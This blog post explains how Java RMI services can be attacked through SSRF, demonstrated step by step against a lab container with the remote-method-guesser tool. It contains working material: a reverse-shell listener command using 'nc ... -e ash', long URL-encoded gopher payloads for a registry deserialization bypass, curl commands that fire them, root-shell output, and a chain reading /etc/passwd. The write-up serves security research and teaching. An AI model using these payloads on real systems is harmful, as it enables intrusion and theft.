---
title: "Attacking Java RMI via SSRF"
date: 2021-12-10
author: "Tobias Neitzel"

tags: 
- rmi
- jmx
- ssrf
- java rmi
- remote-method-guesser
- beanshooter

categories:
- java
- ssrf

ShowToc: True
cover:
    image: "/img/01-rmi-ssrf/01-intro.png"
    alt: "Attacking Java RMI via SSRF"
---


During the last couple of years, *SSRF* vulnerabilities
have become more and more popular and several high impact
vulnerabilities have been identified. Possible targets in
the backend range from *HTTP* based services like *Solr*,
over cloud metadata services, up to more exotic targets
like *redis* databases. In this blog post we discuss the
*SSRFibility* of *Java RMI* and demonstrate how *RMI*
services can be targeted via *SSRF*.


### The SSRFibility of Java RMI

---

*Java RMI* is an object oriented *RPC* (*Remote Procedure Call*) mechanism
that is available by default in most *Java* installations. Developers can
use *Java RMI* to create *remote objects* that expose their functions on
the network and allow remote clients to call them. *Java RMI* communication
relies on serialized *Java* objects, which makes the protocol a prime target
for attackers. Over the last couple of years, the security of *Java RMI*
has vastly improved, but vulnerable endpoints are still encountered quite
frequently. Moreover, even a fully patched *RMI* service can yield as an
entry point for attackers when the available *remote objects* expose dangerous
functions.

If you ever implemented something yourself using *Java RMI*, you probably
doubt that the protocol can be targeted by *SSRF* attacks. For those who
never used *Java RMI* in practice, here is a short example how a typical *RMI*
client looks like:

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExampleClient {

  public static void main(String[] args) {

    try {
      Registry registry = LocateRegistry.getRegistry(remoteHost);
      RemoteService ref = (RemoteService)registry.lookup("remote-service");
      String response = ref.getVersion();
    
    } catch( Exception e) {
      e.printStackTrace();
    }
  }
}
```

This code snipped does basically the following:

1. Connect to an *RMI registry* (name service for *remote objects*. Can be compared to *DNS*)
2. Lookup the name ``remote-service`` to obtain a reference to an *remote object*
3. Call the ``getVersion`` function on the *remote object*

Despite ``ref`` is an object created in your local *JVM*, calls on this object
are forwarded to the *RMI* server. This demonstrates that *Java RMI* uses an *object
oriented RPC* mechanism, where local objects are used to consume remote services.
This *object oriented RPC* implementation creates the impression of a strong coupling
between the local objects and the remote service which makes *SSRF* attacks seem impossible.
But this is not the case as the *RMI protocol* is, like *HTTP*, a stateless protocol and
there is only a loosely coupling between local objects and remote services. But we go ahead
of ourselves as we should start with the *RMI registry*.

#### The RMI Registry

The *RMI registry* is a naming service that is often used to make *RMI* services available
on the network. In order to connect to a *remote object*, clients usually need a certain
amount of information:

* The IP address and TCP port the *remote object* is available on
* The class / interface that is implemented by the *remote object*
* The ``ObjID`` of the *remote object* (an internal identifier)

All this information is stored within the *RMI registry*  and can be accessed under a human readable
name (*boundname*). In the example above, we looked up the human readable name ``remote-service``
from the *RMI registry* and obtained a reference to the corresponding *remote object*. This reference
stores all the required information for remote procedure calls and forwards method invocations to
the *remote object*.

An important detail is now, that the *RMI registry* is a *remote object* itself, but in contrast
to the ``RemoteService`` *remote object*, the *RMI registry* is a well known *remote object*. This
means, that the implemented class and the assigned ``ObjID`` are fixed and known by *RMI clients*.
Hence, to communicate with the *RMI registry*, only the IP address and the TCP port are required.
This makes the *RMI registry* an easier target for *SSRF* attacks and we discuss it first before
going over to non well known *RMI services*.

#### The Java RMI Protocol

Whether or not the *RMI registry* can now be targeted by *SSRF* attacks depends on the structure of the
*RMI* protocol. In the following diagram I tried to visualize how a typical *RMI* communication looks like:

![Java RMI Protocol](/img/01-rmi-ssrf/02-java-rmi-protocol.png)

The typical *RMI* communication consists out of a *handshake* and one or more *method calls*. During the
*handshake*, some static data and information on the server and client host are exchanged. It is worth noting
that none of the exchanged information depends on previously received data. Therefore, it is possible
to predict all values that are used in the handshake, which will be important when performing *SSRF* attacks.

After the *handshake* completed, the client can start to dispatch method calls. It is generally possible
to dispatch multiple method calls in one communication channel, but apart from reducing the amount of
network traffic, it does not has any benefits. As mentioned previously, the *RMI* protocol is stateless and
it makes no difference whether multiple calls are dispatched in one or within multiple communication channels.

From the *SSRF* perspective, the handshake part of the *RMI* protocol looks problematic. *SSRF* vulnerabilities
usually only allow a one shot kind of attack and interactive communication like a handshake is not possible.
In the case of *Java RMI* however, the handshake does not matter, as the *RMI server* reads data one by one from
the underlying *TCP* stream. This allows the client to send all required data right at the beginning without waiting
for any server responses. The following diagram shows the *RMI* protocol again, but this time how it would be
utilized during an *SSRF* attack:

![Java RMI Protocol During SSRF](/img/01-rmi-ssrf/03-java-rmi-protocol-ssrf.png)

Another problem we have not talked about so far are data types. It should be obvious that a basic *HTTP* based
*SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
(*RMI Magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
able to send arbitrary bytes to the target *RMI service*, which is an annoying restriction. Especially null bytes need
to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions [\[1\]](#references).
However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
calls as with a direct connection.

#### The ObjID Problem

An attack as demonstrated in *figure 2* requires the client to know all data that needs to be send to the *RMI server*
in advance. This is possible for well known *RMI* services with a fixed ``ObjID`` value like the *RMI registry* (``ObjID = 0``),
the *Activation System* (``ObjID = 1``) or the *Distributed Garbage Collector* (``ObjID = 2``). Other *remote objects*
get a random ``ObjID`` assigned when they are exported (bound to a *TCP* port). Guessing an ``ObjID`` is basically impossible,
as it consists out of the following components:

* ``objNum`` - A random ``long`` value created by ``SecureRandom`` (set once per object)
* ``UID`` - Compound Object
  * ``unique``- A random ``int`` value created by ``SecureRandom`` (set once per host)
  * ``time`` - A timestamp created during export as ``int`` value
  * ``count`` - An incrementing ``short`` starting at ``Shot.MIN_VALUE``

Getting the ``ObjID`` value for a *remote object* is one of the reasons why *RMI* clients usually need to talk to an *RMI registry*.

So, are *SSRF* attacks on custom *RMI endpoints* impossible now? Well, not completely impossible, but they require an *SSRF* vulnerability
with even more capabilities as in the previous case. Instead of performing a *one shot* attack, we now need at least two shots:

1. Use the *SSRF* vulnerability to perform a ``lookup`` call on the registry
2. Use the obtained ``ObjID`` value to target the *remote object* via *SSRF*

For this to work we obviously need an *SSRF* vulnerability that returns data obtained from the targeted endpoint. Furthermore, the *SSRF*
need to allow arbitrary bytes within the returned data, including null bytes. *SSRF* vulnerabilities with these properties are extremely
rare, but when all conditions are met, you can consume any *RMI* service as with a direct connection.


### Attacking the RMI Registry

To demonstrate the *SSRFibility* of the *Java RMI* protocol, we will now attack an *RMI registry* endpoint using a
webapplication that is vulnerable to *SSRF* attacks. In order to make this as comfortable as possible, we use *remote-method-guesser*
[\[2\]](#references), a *Java RMI* vulnerability scanner with integrated *SSRF* support.
The *remote-method-guesser* repository also contains an *SSRF* example server [\[3\]](#references)
that we can use for demonstration purposes. The setup for the following demonstration looks like this:

* *HTTP* service vulnerable to *SSRF* within the ``url`` parameter on ``http://172.17.0.2:8000``
* *RMI registry* listening at ``localhost:1090`` on the remote server
* Outdated Java version that is vulnerable to *RMI registry* deserialization bypasses
* ``CommonsCollections3.1`` being available on the *RMI* application's classpath
* The *SSRF* vulnerability is *curl* based and allows null bytes within the *gopher* protocol

We start of with an *nmap* scan to demonstrate that no *RMI* ports are exposed directly by the application server:

```console
$ nmap -p- -n 172.17.0.2
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 07:57 CET
Nmap scan report for 172.17.0.2
Host is up (0.000094s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

To demonstrate the *SSRF* vulnerability, we just use a plain *HTTP* callback:

```console
$ curl 'http://172.17.0.2:8000?url=http://172.17.0.1:8000/PoC'
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [20/Dec/2021 08:01:20] "GET /PoC HTTP/1.1" 200 -
```

Now we perform a deserialization attack on the *RMI registry*. The *Java* version on the application server
already implements deserialization filters for *registry* communication, but is vulnerable to known deserialization
filter bypasses. These bypasses work by creating an outbound *RMI* connection to an attacker controlled server.
This outbound connection is no longer protected by deserialization filters and can be used to achieve arbitrary
deserialization.

First we create the required listeners: One for the incoming *RMI* connection, the other for the incoming shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
```

Now we create the *SSRF* payload. Creating *SSRF* payloads with *remote-method-guesser* is quite simple. Almost
each operation supports the ``--ssrf`` option. Instead of performing the corresponding operation on a remote server,
a corresponding *SSRF* payload is printed to stdout. For our purpose we need to target the *RMI registry* on the
remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the most
recent deserialization filter bypass:

```console
$ rmg serial 127.0.0.1 1090 AnTrinh 172.17.0.1:4444 --component reg --ssrf --gopher --encode
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578
```

*SSRF* payloads can be generated in different formats. We choose *gopher* format and *URL* encode the
payload to make it directly usable within a *curl* command. Now we only need to send this payload to the
remote server:

```console
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578'
```

This should cause incoming connections on our listeners and we should obtain a shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
Have connection from /172.17.0.2:51246
Reading message...
Sending return with payload for obj [0:0:0, 123]
Closing connection

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:33809.
id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully used a blind *SSRF* vulnerability to attack a vulnerable *RMI registry*. The following gif
shows all of the above mentioned steps in action:

![RMI SSRF Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/ssrf.gif)


### Attacking Custom RMI Services

The ssrf-server [3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server) from
the *remote-method-guesser* repository runs one custom *RMI service* that is, like the *RMI registry*, only reachable from localhost.
The corresponding service implements the ``IFileManager`` interface with the following method signatures:

```java
public interface IFileManager extends Remote
{
    File[] list(String dir) throws RemoteException;
    byte[] read(String file) throws RemoteException, IOException;
    String write(String file, byte[] content) throws RemoteException, IOException;
    String copy(String src, String dest) throws RemoteException, IOException, InterruptedException;
}
```

We want to use the *SSRF* vulnerability in the *HTTP* frontend to call the ``read`` method and extract the ``/etc/passwd``
file from the server. Sounds easy, but we need to obtain the *TCP* endpoint and the ``ObjID`` value of the *remote object*
first and are required to perform a lookup operation on the *RMI registry* via *SSRF*. For this purpose, we can again use
*remote-method-guesser*.

When using *remote-method-guesser's* ``enum`` action, several different checks are performed on the targeted *RMI endpoint*.
On *RMI registry* endpoints, one of the checks includes a lookup for all available *remote objects*. When using the ``--ssrf``
option together with the ``enum`` action, it is not possible to perform multiple checks at once and the created *SSRF* payload
performs only a single check. You can use the ``--scan-action <ACTION>`` option to select which check you want to perform.
In out case, we want to perform the ``list`` check, that lists all available bound names within the *RMI registry*:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df' --silent | xxd -p -c1000
4e00093132372e302e302e31000083b051aced0005770f019dd4a2bf0000017ddbb22e468007757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d6
```

The *ssrf-server* we are using implements an *SSRF* vulnerability that is capable of returning binary data. This binary
data now contains the response from the *RMI registry*. To extract the required information from the response, we can
use *remote-method-guesser's* ``--ssrf-response`` option. This option takes the hex encoded response from an *RMI endpoint*
and interprets it in the specified context:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --ssrf-response 4e00093132372e302e302e31000083b051aced0005770f019dd4a2bf0000017ddbb22e468007757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 	- jmxrmi
```

Now we obtained the available *bound names* within the *RMI registry*, but we are still missing the *TCP* endpoint and the ``ObjID`` value.
The problem here is that *remote-method-guesser* needs to perform a call to the registry's ``list`` function first, before it can perform the
``lookup`` call.  As only one call is possible per *SSRF* attack, the ``lookup`` action is therefore missing. However, we can use the
``--bound-name`` option to specify the targeted *bound name* directly and *remote-method-guesser* skips the ``list`` call in this case:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name FileManager --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572' --silent | xxd -p -c1000
4e00093132372e302e302e31000083b851aced0005770f019dd4a2bf0000017ddbb22e46800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f7374000088a9508c910dd1597f3e9dd4a2bf0000017ddbb22e4680010178
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name FileManager --ssrf-response 4e00093132372e302e302e31000083b851aced0005770f019dd4a2bf0000017ddbb22e46800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f7374000088a9508c910dd1597f3e9dd4a2bf0000017ddbb22e4680010178
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager (unknown class)
[+] 		    Endpoint: localhost:34985 ObjID: [-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://localhost:8000/rmi-class-definitions.jar
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManage
```

Now we have everything what we need. The targeted *remote object* listens on ``localhost:34985`` with an ``ObjID`` of
``[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]``. We can now use *remote-method-guesser's* ``call`` action, to call
the ``read`` method on this object:

```console
$ rmg call 127.0.0.1 34985 '"/etc/passwd"' --signature 'byte[] read(String file)' --objid '[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]' --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A34985%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2550%258c%2591%250d%25d1%2559%257f%253e%259d%25d4%25a2%25bf%2500%2500%2501%257d%25db%25b2%252e%2546%2580%2501%25ff%25ff%25ff%25ff%258c%256a%255e%2578%25a5%2563%252a%258f%2574%2500%250b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%256
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A34985%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2550%258c%2591%250d%25d1%2559%257f%253e%259d%25d4%25a2%25bf%2500%2500%2501%257d%25db%25b2%252e%2546%2580%2501%25ff%25ff%25ff%25ff%258c%256a%255e%2578%25a5%2563%252a%258f%2574%2500%250b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564' --silent | xxd -p -c10000
4e00093132372e302e302e310000b1ee51aced0005770f019dd4a2bf0000017ddbb22e468018757200025b42acf317f8060854e0020000707870000004d4726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f6173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a31333a6e6577733a2f7573722f6c69622f6e6577733a2f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31343a757563703a2f7661722f73706f6f6c2f757563707075626c69633a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a6d616e3a783a31333a31353a6d616e3a2f7573722f6d616e3a2f7362696e2f6e6f6c6f67696e0a706f73746d61737465723a783a31343a31323a706f73746d61737465723a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a63726f6e3a783a31363a31363a63726f6e3a2f7661722f73706f6f6c2f63726f6e3a2f7362696e2f6e6f6c6f67696e0a6674703a783a32313a32313a3a2f7661722f6c69622f6674703a2f7362696e2f6e6f6c6f67696e0a737368643a783a32323a32323a737368643a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a61743a783a32353a32353a61743a2f7661722f73706f6f6c2f63726f6e2f61746a6f62733a2f7362696e2f6e6f6c6f67696e0a73717569643a783a33313a33313a53717569643a2f7661722f63616368652f73717569643a2f7362696e2f6e6f6c6f67696e0a7866733a783a33333a33333a5820466f6e74205365727665723a2f6574632f5831312f66733a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a33353a33353a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a63797275733a783a38353a31323a3a2f7573722f63797275733a2f7362696e2f6e6f6c6f67696e0a76706f706d61696c3a783a38393a38393a3a2f7661722f76706f706d61696c3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a3132333a3132333a4e54503a2f7661722f656d7074793a2f7362696e2f6e6f6c6f67696e0a736d6d73703a783a3230393a3230393a736d6d73703a2f7661722f73706f6f6c2f6d71756575653a2f7362696e2f6e6f6c6f67696e0a67756573743a783a3430353a3130303a67756573743a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a6375726c5f757365723a783a3130303a3130313a4c696e757820557365722c2c2c3a2f686f6d652f6375726c5f757365723a2f7362696e2f6e6f6c6f67696e0a
